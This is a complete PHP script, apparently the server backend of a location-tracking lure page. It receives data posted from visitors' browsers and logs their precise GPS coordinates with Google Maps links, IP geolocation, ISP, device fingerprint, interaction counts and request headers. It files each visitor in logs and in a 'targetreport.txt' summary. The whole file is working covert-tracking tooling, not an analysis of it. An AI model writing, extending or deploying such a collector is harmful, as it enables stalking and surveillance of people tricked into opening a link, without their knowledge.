<?php
// Create logs directory if it doesn't exist
if (!is_dir('logs')) {
    mkdir('logs', 0777, true);
}

// Get the raw POST data
$rawData = file_get_contents('php://input');
$data = json_decode($rawData, true);
$timestamp = date('Y-m-d H:i:s');

// Generate unique ID for this session
$sessionId = md5($timestamp . $_SERVER['REMOTE_ADDR'] . rand(1000, 9999));

// Log file names
$logFile = "logs/session_{$sessionId}.log";
$masterLog = "logs/all_sessions.log";
$gpsLog = "logs/gps_locations.log";
$ipLog = "logs/ip_addresses.log";

// Function to write log with format
function writeLog($file, $content) {
    file_put_contents($file, $content, FILE_APPEND | LOCK_EX);
}

// Log raw data for debugging
writeLog("logs/raw_data.log", "\n=== RAW DATA {$timestamp} ===\n{$rawData}\n");

// Process location data
if (isset($data['gpsLocation'])) {
    $gpsData = [
        'timestamp' => $timestamp,
        'session_id' => $sessionId,
        'latitude' => $data['gpsLocation']['latitude'],
        'longitude' => $data['gpsLocation']['longitude'],
        'accuracy' => $data['gpsLocation']['accuracy'] ?? 'N/A',
        'altitude' => $data['gpsLocation']['altitude'] ?? 'N/A',
        'source' => $data['gpsSource'] ?? 'unknown',
        'ip' => $data['ip'] ?? $_SERVER['REMOTE_ADDR']
    ];
    
    writeLog($gpsLog, json_encode($gpsData, JSON_PRETTY_PRINT) . ",\n");
    
    // Also create Google Maps link
    $mapsLink = "https://www.google.com/maps?q={$gpsData['latitude']},{$gpsData['longitude']}";
    $gpsData['google_maps'] = $mapsLink;
    
    // Save GPS coordinates separately
    writeLog("logs/gps_coordinates.csv", 
        "{$timestamp},{$sessionId},{$gpsData['latitude']},{$gpsData['longitude']},{$gpsData['accuracy']},{$mapsLink}\n"
    );
}

// Process IP data
if (isset($data['ip'])) {
    $ipData = [
        'timestamp' => $timestamp,
        'session_id' => $sessionId,
        'ip' => $data['ip'],
        'country' => $data['ipDetails']['country'] ?? 'Unknown',
        'city' => $data['ipDetails']['city'] ?? 'Unknown',
        'isp' => $data['ipDetails']['org'] ?? 'Unknown',
        'user_agent' => $data['userAgent'] ?? 'Unknown',
        'page_type' => $data['pageType'] ?? 'Unknown'
    ];
    
    writeLog($ipLog, json_encode($ipData, JSON_PRETTY_PRINT) . ",\n");
    
    // Save to CSV for easy viewing
    writeLog("logs/ip_tracking.csv", 
        "{$timestamp},{$sessionId},{$ipData['ip']},{$ipData['country']},{$ipData['city']},{$ipData['isp']}\n"
    );
}

// Create detailed session log
$sessionLog = "";
$sessionLog .= "══════════════════════════════════════════════════════════════════════════\n";
$sessionLog .= "SESSION ID: {$sessionId}\n";
$sessionLog .= "TIMESTAMP: {$timestamp}\n";
$sessionLog .= "PAGE TYPE: " . ($data['pageType'] ?? 'Unknown') . "\n";
$sessionLog .= "URL: " . ($data['url'] ?? $_SERVER['REQUEST_URI']) . "\n";
$sessionLog .= "══════════════════════════════════════════════════════════════════════════\n\n";

// IP Information
$sessionLog .= "🌐 IP INFORMATION:\n";
$sessionLog .= "────────────────────────────────────────────────────────────\n";
$sessionLog .= "IP Address: " . ($data['ip'] ?? $_SERVER['REMOTE_ADDR']) . "\n";
if (isset($data['ipDetails'])) {
    $sessionLog .= "Country: " . ($data['ipDetails']['country'] ?? 'N/A') . "\n";
    $sessionLog .= "Region: " . ($data['ipDetails']['region'] ?? 'N/A') . "\n";
    $sessionLog .= "City: " . ($data['ipDetails']['city'] ?? 'N/A') . "\n";
    $sessionLog .= "ISP: " . ($data['ipDetails']['org'] ?? 'N/A') . "\n";
    $sessionLog .= "Timezone: " . ($data['ipDetails']['timezone'] ?? 'N/A') . "\n";
    $sessionLog .= "Coordinates: " . 
        ($data['ipDetails']['latitude'] ?? 'N/A') . ", " . 
        ($data['ipDetails']['longitude'] ?? 'N/A') . "\n";
}
$sessionLog .= "────────────────────────────────────────────────────────────\n\n";

// GPS Location
if (isset($data['gpsLocation'])) {
    $sessionLog .= "📍 GPS LOCATION (High Accuracy):\n";
    $sessionLog .= "────────────────────────────────────────────────────────────\n";
    $sessionLog .= "Latitude: " . $data['gpsLocation']['latitude'] . "\n";
    $sessionLog .= "Longitude: " . $data['gpsLocation']['longitude'] . "\n";
    $sessionLog .= "Accuracy: " . ($data['gpsLocation']['accuracy'] ?? 'N/A') . " meters\n";
    if (isset($data['gpsLocation']['altitude'])) {
        $sessionLog .= "Altitude: " . $data['gpsLocation']['altitude'] . " meters\n";
    }
    if (isset($data['gpsLocation']['speed'])) {
        $sessionLog .= "Speed: " . $data['gpsLocation']['speed'] . " m/s\n";
    }
    $sessionLog .= "Google Maps: https://www.google.com/maps?q=" . 
        $data['gpsLocation']['latitude'] . "," . $data['gpsLocation']['longitude'] . "\n";
    $sessionLog .= "Source: " . ($data['gpsSource'] ?? 'GPS') . "\n";
    $sessionLog .= "────────────────────────────────────────────────────────────\n\n";
} elseif (isset($data['gpsError'])) {
    $sessionLog .= "❌ GPS ERROR:\n";
    $sessionLog .= "────────────────────────────────────────────────────────────\n";
    $sessionLog .= "Error: " . $data['gpsError'] . "\n";
    $sessionLog .= "────────────────────────────────────────────────────────────\n\n";
}

// Device Information
$sessionLog .= "📱 DEVICE INFORMATION:\n";
$sessionLog .= "────────────────────────────────────────────────────────────\n";
$sessionLog .= "User Agent: " . ($data['userAgent'] ?? 'Unknown') . "\n";
$sessionLog .= "Platform: " . ($data['platform'] ?? 'Unknown') . "\n";
$sessionLog .= "Language: " . ($data['language'] ?? 'Unknown') . "\n";
$sessionLog .= "Screen: " . ($data['screen']['width'] ?? 'N/A') . "x" . ($data['screen']['height'] ?? 'N/A') . "\n";
$sessionLog .= "Color Depth: " . ($data['screen']['colorDepth'] ?? 'N/A') . "\n";
$sessionLog .= "Timezone: " . ($data['timezone'] ?? 'Unknown') . "\n";
$sessionLog .= "Cookies Enabled: " . ($data['cookiesEnabled'] ? 'Yes' : 'No') . "\n";
$sessionLog .= "Online Status: " . ($data['online'] ? 'Online' : 'Offline') . "\n";
$sessionLog .= "Hardware Concurrency: " . ($data['hardwareConcurrency'] ?? 'N/A') . "\n";
$sessionLog .= "Device Memory: " . ($data['deviceMemory'] ?? 'N/A') . " GB\n";
$sessionLog .= "────────────────────────────────────────────────────────────\n\n";

// Network Information
if (isset($data['connection'])) {
    $sessionLog .= "📶 NETWORK INFORMATION:\n";
    $sessionLog .= "────────────────────────────────────────────────────────────\n";
    $sessionLog .= "Connection Type: " . ($data['connection']['effectiveType'] ?? 'N/A') . "\n";
    $sessionLog .= "Download Speed: " . ($data['connection']['downlink'] ?? 'N/A') . " Mbps\n";
    $sessionLog .= "Round Trip Time: " . ($data['connection']['rtt'] ?? 'N/A') . " ms\n";
    $sessionLog .= "Save Data: " . (($data['connection']['saveData'] ?? false) ? 'Enabled' : 'Disabled') . "\n";
    $sessionLog .= "────────────────────────────────────────────────────────────\n\n";
}

// User Interactions
if (isset($data['interactions'])) {
    $sessionLog .= "🖱️ USER INTERACTIONS:\n";
    $sessionLog .= "────────────────────────────────────────────────────────────\n";
    $sessionLog .= "Clicks: " . ($data['interactions']['clicks'] ?? 0) . "\n";
    $sessionLog .= "Scrolls: " . ($data['interactions']['scrolls'] ?? 0) . "\n";
    $sessionLog .= "Key Presses: " . ($data['interactions']['keypresses'] ?? 0) . "\n";
    $sessionLog .= "Mouse Movements: " . ($data['interactions']['mouseMovements'] ?? 0) . "\n";
    if (isset($data['totalTimeOnPage'])) {
        $seconds = round($data['totalTimeOnPage'] / 1000, 2);
        $sessionLog .= "Time on Page: {$seconds} seconds\n";
    }
    $sessionLog .= "────────────────────────────────────────────────────────────\n\n";
}

// Referrer Information
if (isset($data['referrer']) && $data['referrer']) {
    $sessionLog .= "🔗 REFERRER INFORMATION:\n";
    $sessionLog .= "────────────────────────────────────────────────────────────\n";
    $sessionLog .= "Referrer URL: " . $data['referrer'] . "\n";
    $sessionLog .= "────────────────────────────────────────────────────────────\n\n";
}

// Append to main data.txt
writeLog("data.txt", $sessionLog);

// Write individual session log
writeLog($logFile, $sessionLog);

// Append to master log
writeLog($masterLog, $sessionLog);

// Save to targetreport.txt for quick viewing
$quickReport = "[" . $timestamp . "] " . 
               "IP: " . ($data['ip'] ?? $_SERVER['REMOTE_ADDR']) . " | " .
               "GPS: " . (isset($data['gpsLocation']) ? 
                   "📍 " . $data['gpsLocation']['latitude'] . "," . $data['gpsLocation']['longitude'] : 
                   "❌ No GPS") . " | " .
               "Page: " . ($data['pageType'] ?? 'Unknown') . " | " .
               "Device: " . ($data['platform'] ?? 'Unknown') . "\n";
writeLog("targetreport.txt", $quickReport);

// Send response
header('Content-Type: application/json');
echo json_encode([
    'status' => 'success',
    'message' => 'Data received and logged',
    'session_id' => $sessionId,
    'timestamp' => $timestamp
]);

// Log HTTP headers for debugging
$headers = [];
foreach ($_SERVER as $key => $value) {
    if (strpos($key, 'HTTP_') === 0) {
        $headers[$key] = $value;
    }
}
writeLog("logs/http_headers.log", 
    "\n=== HEADERS {$timestamp} ===\n" . 
    print_r($headers, true) . 
    "────────────────────────────────────────────────────────────\n"
);
?>  